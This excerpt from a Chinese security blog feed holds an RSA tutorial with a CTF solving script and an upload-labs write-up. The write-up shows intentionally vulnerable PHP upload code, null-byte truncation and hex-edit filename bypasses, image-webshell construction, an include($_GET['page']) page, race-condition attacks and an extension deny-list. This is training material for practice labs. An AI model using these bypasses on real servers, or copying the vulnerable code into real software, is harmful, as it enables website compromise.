      <link href="2019/08/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3%EF%BC%81/"/>
      <url>2019/08/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><strong>引言</strong>：<br>CTF密码学类题目中，RSA加密可谓是很重要且常见的加密类型，今天就总结下RSA加密的原理及解密方法。</p><a id="more"></a><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法:"></a>RSA算法:</h2><ul><li>RSA加密算法是一种<code>非对称加密</code>算法，RSA算法相比别的算法思路非常清晰，但是想要破解的难度非常大。</li><li>RSA算法基于一个非常简单的数论事实：两个素数相乘得到一个大数很容易，但是由一个大数分解为两个素数相乘却非常难。<br><img src="http://img-blog.csdnimg.cn/20190815133727214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h2 id="公钥和私钥的生成："><a href="#公钥和私钥的生成：" class="headerlink" title="公钥和私钥的生成："></a>公钥和私钥的生成：</h2><p><strong>第一步：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全</strong></p><p> 比如 P = 67 ，Q = 71。计算他们的乘积 n = P * Q = 4757 ，转化为二进为1001010010101，该加密算法即为 13 位，实际算法是 1024 位 或 2048 位，位数越长，算法越难被破解。</p><p> <strong>第二步：计算 n 的欧拉函数 φ(n)</strong></p><p> φ(n) 表示在小于等于 n 的正整数之中，与 n 构成互质关系的数的个数。例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果 n = P * Q，P 与 Q 均为质数，则 φ(n) = φ(P * Q)= φ(P - 1)φ(Q - 1) = (P - 1)(Q - 1) 。 本例中 φ(n) = 66 * 70 = 4620，这里记为 m， m = φ(n) = 4620</p><p> <strong>第三步：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质</strong></p><p> 公约数只有 1 的两个整数，叫做互质整数，这里我们随机选择 e = 101 请注意不要选择 4619，如果选这个，则公钥和私钥将变得相同。</p><p> *<em>第四步：有一个整数 d，可以使得 e</em>d  除以 m 的余数为 1**</p><p>即找一个整数 d，使得  (e * d ) % m = 1。 等价于e * d - 1 = y * m ( y 为整数） 找到 d ，实质就是对下面二元一次方程求解。 e * x - m * y =1 ，其中 e = 101，m = 4620； 101x - 4620y =1 这个方程可以用<strong>扩展欧几里得算法</strong>求解，此处省略具体过程。<br> 总之算出一组整数解  <code>（x，y ）= （ 1601，35）</code>，即 d = 1601。 到此密钥对生成完毕。不同的 e 生成不同的 d，因此可以生成多个密钥对。 本例中公钥为 <code>（n，e) = (4757 , 101)</code>，私钥为 <code>（n，d) = (4757 ，1601)</code> ，仅 <code>（n，e) = (4757 , 101)  </code>是公开的，其余数字均不公开。可以想像如果只有 n 和 e，如何推导出 d，目前只能靠暴力破解，位数越长，暴力破解的时间越长。</p><h2 id="加密生成密文-："><a href="#加密生成密文-：" class="headerlink" title="加密生成密文 ："></a>加密生成密文 ：</h2><p>比如甲向乙发送汉字“中”，就要使用乙的公钥加密汉字 “中”， 以 utf-8 方式编码为 [e4 b8 ad]，转为 10 进制为 [228,184,173]。要想使用公钥<code>（n，e) = (4757 , 101)</code>加密，要求被加密的数字必须小于 n，被加密的数字必须是整数，字符串可以取 ascii 值或unicode值，因此将“中”字折为三个字节 [228,184,173]，分别对三个字节加密。</p><p>假设 a 为明文，b 为密文，则按下列公式计算出 b</p><pre><code>a^e % n = b </code></pre><p>计算 [228,184,173]的密文：</p><pre><code>228^101 % 4757 = 4296184^101 % 4757 = 2458173^101 % 4757 = 3263</code></pre><p>即 [228,184,173]加密后得到密文 [4296，2458，3263] ，如果没有私钥 d ,神仙也无法从 [4296，2458，3263]中恢复 [228,184,173]。</p><h2 id="解密生成明文："><a href="#解密生成明文：" class="headerlink" title="解密生成明文："></a>解密生成明文：</h2><p>乙收到密文 [4296，2458，3263]，并用自己的私钥<code>（n，d) = (4757 ，1601)</code> 解密。解密公式如下：<br>假设 a 为明文，b 为密文，则按下列公式计算出 a</p><pre><code>a^d % n = b </code></pre><p>密文 [4296，2458，3263] 的明文如下：</p><pre><code>4296^1601% 4757 = 2282458^1601% 4757 = 1843263^1601% 4757 = 173</code></pre><p>即密文 [4296，2458，3263] 解密后得到 [228,184,173]<br>将[228,184,173] 再按 utf-8 解码为汉字 “中”，至此解密完毕。</p><p>参考blog     <a href="https://www.jianshu.com/p/fbb8bf7baa97">https://www.jianshu.com/p/fbb8bf7baa97</a></p><p>现在知道了加密解密的基本原理，下面就做几个题展示下。<hr></p><p><strong>1.easy_RSA</strong></p><p><img src="http://img-blog.csdnimg.cn/20190815235347407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开附件：<br><img src="http://img-blog.csdnimg.cn/20190815235420989.png" alt="在这里插入图片描述"><br>这题很简单，就是求参数d的值<br>那么如何计算d呢？也就是如何求e * x - m * y =1 式子中的x的值，这个时候就需要了解以下扩展欧几里得算法了，<a href="http://blog.csdn.net/destiny1507/article/details/81750874">扩展欧几里得算法详解</a>看完应该了解了计算的原理<br>这里分享一个脚本（需要安装gmpy2）：</p><pre><code>#!/usr/bin/env python3# -*- coding:utf-8 -*-import gmpy2p = 473398607161q = 4511491e = 17s = (p-1)*(q-1)d = gmpy2.invert(e,s)print(&#39;flag is :&#39;,d)</code></pre><p>得到<code>d=125631357777427553</code> flag为<code>cyberpeace&#123;125631357777427553&#125;</code><br>好，关于RSA的加密解密原理，就先总结到这吧，以后发现好用的方法或解题技巧会接着更新。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞 upload-labs 练习（二）</title>
      <link href="2019/08/14/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/08/14/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>接着上篇的总结   （=￣ω￣=）<br>Less-11—20</p><p>上篇链接：<a href="https://blog.csdn.net/qq_43531669/article/details/98470372">点这</a>  <hr></p><p><strong>Less-11</strong><br>这关采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀<br>查看源码：</p><pre><code>    $is_upload = false;    $msg = null;    if(isset($_POST[&#39;submit&#39;]))&#123;      $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);      $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);      if(in_array($file_ext,$ext_arr))&#123;      $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];      $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;       if(move_uploaded_file($temp_file,$img_path))&#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;        &#125;    &#125;</code></pre><p>处理上传文件的方式</p><pre><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>看起来这样防御并没有什么问题，但是这一关上传目录是可控的，所以可以先上传一个后缀名为<code>.jpg</code>，然后修改上传目录为<code>.php</code>后缀，之后在<code>.php</code>后使用截断后面的拼接内容，注意这里需要关掉<code>magic_quotes_gpc</code>这个php扩展，否则00会被转义<br><code>$_GET[&#39;save_path&#39;]</code>这里使用00截断<code>.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code><br>注意这里的00字符因为在url的GET参数中，所以需用进行url编码</p><ul><li><p><strong>截断的条件</strong>：<br>1）php版本必须小于5.3.4<br>2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off</p></li><li><p><strong>关闭magic_quotes_gpc函数</strong>:<br>在php.ini文件内找到<br><code> magic_quotes_gpc = On</code><br>将其改为<br>  <code>magic_quotes_gpc = Off</code></p></li></ul><p><img src="http://img-blog.csdnimg.cn/20190809224249503.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019080922323739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>配置好后，上传webshell.jpg，抓包，添加<code>webshell.php%00</code></p><p><img src="http://img-blog.csdnimg.cn/20190809231037491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功<br><img src="http://img-blog.csdnimg.cn/20190809231148663.png" alt="在这里插入图片描述"></p><p><strong>Less-12</strong><br>和Less-11不同的是这次的<code>save_path</code>是通过<strong>post</strong>传进来的，我们还利用00截断，但这题需要在<strong>十六进制</strong>中进行修改，因为post不会像get对<code>%00</code>进行自动解码。<br>步骤：上传webshell.jpg 然后 <strong>send to repeater</strong><br><img src="http://img-blog.csdnimg.cn/20190811130122673.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加文件 <code>wenshell.php(空格)  </code><br><img src="http://img-blog.csdnimg.cn/20190811130316391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>空格的十六进制为<code>20</code>然后找到<code>20</code> 改为<code>00</code><br><img src="http://img-blog.csdnimg.cn/20190811130824433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后点击send 发包就好了<br><img src="http://img-blog.csdnimg.cn/20190811131019426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包成功。</p><p><strong>Less-13</strong><br>PS：</p><blockquote><p>这关需要将服务器版本改到PHP5.3及以上才行，不然运行文件包含漏洞会报错</p></blockquote><p>查看源码：</p><pre><code>function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode)&#123;              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        &#125;            return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;)&#123;        $msg = &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;&#125;</code></pre><p>发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可；<br>图片制作方法：<code>copy 1.jpg /b + shell.php /a webshell.jpg </code>（图片一句话木马为：<code>&lt;?php phpinfo(); ?&gt;</code> ）<br>解释：参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件）<br><img src="http://img-blog.csdnimg.cn/20190811161026745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>制作成功<br><img src="http://img-blog.csdnimg.cn/20190811161038122.png" alt="在这里插入图片描述"><br>然后直接上传<br><img src="http://img-blog.csdnimg.cn/20190811215009440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功，得到文件名，如果是上传的是一句话木马就能连接菜刀了；我们上传的是图片码，可以利用文件包含漏洞进行测试：<br>先新建一个包含文件漏洞的页面upload.php，将该文件放在根目录下：</p><pre><code>&lt;?php$file = $_GET[ &#39;page&#39; ];include($file);?&gt; </code></pre><p>测试使用，包含成功<br><code>http://127.0.0.1/upload-labs-master/upload/include.php?page=文件名</code><br><img src="http://img-blog.csdnimg.cn/20190812101341510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另外有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex创建shell.jpg伪图片马<br><img src="http://img-blog.csdnimg.cn/20190812144541935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Less-14</strong><br>查看关键代码：</p><pre><code>$types = &#39;.jpeg|.png|.gif&#39;;     if(file_exists($filename))&#123;        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);1234</code></pre><p>这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过，绕过方法同Less13 ，这里就不演示了<br>知识补充：</p><pre><code>array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。</code></pre><p><strong>Less-15</strong><br>关键源码：</p><pre><code>function isImage($filename)&#123;    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) &#123;        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    &#125;&#125;</code></pre><p>利用<code>php_exif</code>模块判断文件类型，还是直接利用图片马就可以绕过。（查看下你的<code>php_exif</code>模块是否打开，没有的话就勾上）<br><img src="http://img-blog.csdnimg.cn/20190812103603762.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接上传图片马，仍和 less-13一样<br><img src="http://img-blog.csdnimg.cn/2019081214094798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-16</strong><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;]))&#123;    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else&#123;        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    &#125;&#125;</code></pre><p>通过源码可以看到对文件后缀名和<strong>MIME</strong>类型进行了检查，而且用到了php的<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为<code>jpg、png、gif</code>的一句话木马，这样的话上传的一句话木马会绕过后缀名和<strong>MIME</strong>类型的检查，通过<code>move_uploaded_file</code>上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器</p><p>上传后缀名为<code>jpg、png、gif</code>之一的图片马，<img src="http://img-blog.csdnimg.cn/20190812144948969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到上传成功，但是我的并没有成功解析；<br><img src="http://img-blog.csdnimg.cn/20190812152128350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>wenHex打开发现并查找不到我们的木马<br><img src="http://img-blog.csdnimg.cn/20190812152339238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>无奈 翻翻大佬们的blog发现是在二次渲染的时候被替换了，至于解决办法请看这位大佬写的<a href="https://xz.aliyun.com/t/2657">点这</a>我就不再描述(●’◡’●)</p><p><strong>Less-17</strong><br>本关考察的是条件竞争，查看代码：</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#39;上传出错！&#39;;    &#125;&#125;</code></pre><p>这题我是蒙蔽的，好在看了大佬的操作才后知道了些；这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。</p><ul><li><p><code>unlink()</code> 函数是用来删除文件的</p></li><li><p>什么是条件竞争：</p></li></ul><blockquote><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p></blockquote><ul><li>首先在burp中不断发送上传webshell的数据包：</li><li>然后不断在浏览器中访问，发现通过竞争可以访问到：</li></ul><p>具体的操作方法我也没掌握，等学习到了就补上</p><p><strong>Less-18</strong><br>本关需要上传图片马，查看代码</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;]))&#123;    require_once(&quot;./myupload.php&quot;);    $imgFileName =time();    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) &#123;        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = &#39;文件已经被上传，但没有重命名。&#39;;            break;         case -1:            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;            break;         case -2:            $msg = &#39;上传失败，上传目录不可写。&#39;;            break;         case -3:            $msg = &#39;上传失败，无法上传该类型文件。&#39;;            break;         case -4:            $msg = &#39;上传失败，上传的文件过大。&#39;;            break;         case -5:            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;            break;         case -6:            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;            break;              default:            $msg = &#39;未知错误！&#39;;            break;    &#125;&#125;//myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted = array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir )&#123;        $ret = $this-&gt;isUploadedFile();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkExtension();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkSize();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // if flag to check if the file exists is set to 1    if( $this-&gt;cls_file_exists == 1 )&#123;      $ret = $this-&gt;checkFileExists();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 )&#123;      $ret = $this-&gt;renameFile();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );  &#125;.................. &#125;;</code></pre><p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，然后再 <code>$ret = $this-&gt;renameFile();</code>，进行了一次更改文件名；同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。</p><p><strong>Less-19</strong><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = $_POST[&#39;save_name&#39;];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = true;            &#125;else&#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125;else&#123;            $msg = &#39;禁止保存为该类型文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>分析，<code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，<br>因此可以在<code>save_name</code>利用00截断绕过：<br>首先上传一个图片马，后缀名改为php+jpg</p><p><img src="http://img-blog.csdnimg.cn/20190814132429106.png" alt="在这里插入图片描述"><br>然后再16进制中把加号的2b 改为 00 fordward发包就行了。然而我的burp不知道为啥发不了，唉<br><img src="http://img-blog.csdnimg.cn/20190814134136876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我又发现，这题可以直接加空格绕过<br><img 